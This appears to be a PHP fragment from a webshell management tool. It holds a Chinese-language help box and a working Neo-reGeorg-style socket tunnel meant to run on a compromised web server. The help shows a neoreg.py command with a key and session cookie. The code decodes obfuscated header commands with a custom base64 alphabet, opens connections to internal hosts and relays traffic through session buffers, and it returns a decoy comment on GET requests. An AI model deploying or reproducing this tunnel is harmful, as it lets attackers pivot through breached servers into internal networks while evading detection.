<div class="sug-box"><div class="sug">本功能提供socket代理服务，模块基于<a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a><br>是一个在 regeorg 基础上重构的 socket 代理服务</div><div class="sug-content">使用方法:</div><div class="active">python3 noereg.py -k reg3uVMc -u http://website.com/script.php?action=socket --cookie "PHPSESSIDS=5dce171e2fab0814d67170153804f937" --skip -p 33344</div><div class="sug">开启Python端服务后，会在本地启动一个监听端口，此时使用代理软件将流量代理至本地端口即可，包括但不限于proxychains、proxifier、浏览器代理插件、抓包软件的上行代理等</div><div class="sug">更多使用方法请前往 Neo-reGeorg 项目查看<div></div>
EOF;
		return $result;
	}

	public function start () {
		if (!function_exists('apache_request_headers')) {
			function apache_request_headers () {
				$arh     = [];
				$rx_http = '/\AHTTP_/';

				foreach ($_SERVER as $key => $val) {
					if (preg_match($rx_http , $key)) {
						$arh_key    = preg_replace($rx_http , '' , $key);
						$rx_matches = [];
						$rx_matches = explode('_' , $arh_key);
						if (count($rx_matches) > 0 and strlen($arh_key) > 2) {
							foreach ($rx_matches as $ak_key => $ak_val) {
								$rx_matches[$ak_key] = ucfirst($ak_val);
							}

							$arh_key = implode('-' , $rx_matches);
						}
						$arh[$arh_key] = $val;
					}
				}
				return ($arh);
			}
		}
		if ($_SERVER['REQUEST_METHOD'] === 'GET')
			exit("<!-- tA7oN3RmYSE1_BjmexlelEPIT0__xWJM3pccknNtRCYLx2XgfI1LZBuKtA -->");

		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
			set_time_limit(0);
			$headers = apache_request_headers();
			$cmd     = $headers["Lmzqtak"];
			$en      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
			$de      = "vrWgLQJuZ3k2lBD481imxPpofeENIFcVTHSqzy6/7KtY5whs0b9RjManGCXd+UOA";
			switch ($cmd) {
				case "FwWT1ocVC83kykxLLy3bzBVPtTwBVB4r91SkvtN25Wm3nI1Bfv876wsulwsa1AUP4":
					{
						$target_ary = preg_split("/\|/" , Decrypt::run(strtr($headers["Ibfszbhyzd"] , $de , $en)) , 2);
						$target     = $target_ary[0];
						$port       = (int) $target_ary[1];
						$res        = fsockopen($target , $port);
						if ($res === false) {
							header('Krqfmtouwpyrwfaf: W4lBVjY4z77aSe7l42VjnfpJ43TMOKnZF_w9x6PwlSie62nlMbF2BjjtrdX9kJKjL');
							header('Djsbchdkjmarmdc: gZkxwb0WUg2r9d0acZFTz2FyJgcOsFoi0');
							return;
						}

						stream_set_blocking($res , false);
						@session_start();
						$_SESSION["run"]      = true;
						$_SESSION["writebuf"] = "";
						$_SESSION["readbuf"]  = "";
						ob_end_clean();
						header('Krqfmtouwpyrwfaf: MWJ7HG75eyrO_glcliIxcf3xqCIqdI');
						header("Connection: close");
						ignore_user_abort();
						ob_start();
						$size = ob_get_length();
						header("Content-Length: $size");
						ob_end_flush();
						flush();
						session_write_close();

						while ($_SESSION["run"]) {
							$readBuff = "";
							@session_start();
							$writeBuff            = $_SESSION["writebuf"];
							$_SESSION["writebuf"] = "";
							session_write_close();
							if ($writeBuff != "") {
								stream_set_blocking($res , false);
								$i = fwrite($res , $writeBuff);
								if ($i === false) {
									@session_start();
									$_SESSION["run"] = false;
									session_write_close();
									header('Krqfmtouwpyrwfaf: W4lBVjY4z77aSe7l42VjnfpJ43TMOKnZF_w9x6PwlSie62nlMbF2BjjtrdX9kJKjL');
									header('Djsbchdkjmarmdc: i8rwYaysPsUrhuJxLbGlUm_sgUEvK_1Ehs1mQ64C1ZyMnCj2qdxVz1iRfDjQWik');
								}
							}
							stream_set_blocking($res , false);
							while ($o = fgets($res , 10)) {
								if ($o === false) {
									@session_start();
									$_SESSION["run"] = false;
									session_write_close();
									header('Krqfmtouwpyrwfaf: W4lBVjY4z77aSe7l42VjnfpJ43TMOKnZF_w9x6PwlSie62nlMbF2BjjtrdX9kJKjL');
									header('Djsbchdkjmarmdc: ICbkCsGKF5');
								}
								$readBuff .= $o;
							}
							if ($readBuff != "") {
								@session_start();
								$_SESSION["readbuf"] .= $readBuff;
								session_write_close();
							}
						}
						fclose($res);
					}
					break;
				case "r19gUFUEKq8DFpZViKDuNYx8":
					{
						error_log("DisConnect recieved");
						@session_start();
						$_SESSION["run"] = false;
						session_write_close();
						return;
					}
					break;
				case "O3BcQJ7qeCFV44Xnuif6LDMQ29nEBbYY3Sfc2OXPnoBmB7AwO_KgDXKwTCnedms":
					{
						@session_start();
						$readBuffer          = $_SESSION["readbuf"];
						$_SESSION["readbuf"] = "";
						$running             = $_SESSION["run"];
						session_write_close();
						if ($running) {
							header('Krqfmtouwpyrwfaf: MWJ7HG75eyrO_glcliIxcf3xqCIqdI');
							header("Connection: Keep-Alive");
							echo strtr(base64_encode($readBuffer) , $en , $de);
							return;
						} else {
							header('Krqfmtouwpyrwfaf: W4lBVjY4z77aSe7l42VjnfpJ43TMOKnZF_w9x6PwlSie62nlMbF2BjjtrdX9kJKjL');
							return;
						}
					}
					break;
				case "nYBUn8kfSa2w1cYsERlwWN_AjaUFyqrcWVKbi":
					{
						@session_start();
						$running = $_SESSION["run"];
						session_write_close();
						if (!$running) {
							header('Krqfmtouwpyrwfaf: W4lBVjY4z77aSe7l42VjnfpJ43TMOKnZF_w9x6PwlSie62nlMbF2BjjtrdX9kJKjL');
							header('Djsbchdkjmarmdc: kZI3KBool1XlLCGCJ94ZPg0DnEcavGjvsj7hCICwbFCRfFMRaoL');
							return;
						}
						header('Content-Type: application/octet-stream');
						$rawPostData = file_get_contents(StringHandler::getWatermalen());
						if ($rawPostData) {
							@session_start();
							$_SESSION["writebuf"] .= Decrypt::run(strtr($rawPostData , $de , $en));
							session_write_close();
							header('Krqfmtouwpyrwfaf: MWJ7HG75eyrO_glcliIxcf3xqCIqdI');
							header("Connection: Keep-Alive");
							return;
						} else {
							header('Krqfmtouwpyrwfaf: W4lBVjY4z77aSe7l42VjnfpJ43TMOKnZF_w9x6PwlSie62nlMbF2BjjtrdX9kJKjL');
							header('Djsbchdkjmarmdc: NabOAGtNbnyCcHU3jHnnnFCJz');
						}
					}
					break;
			}
		}
	}
}

class Decrypt {

	public static function run ($data) {
		return base64_decode($data);
	}
}

ob_start();
$main_handler = new Main();
$main_handler->mainLogin();
ob_end_flush();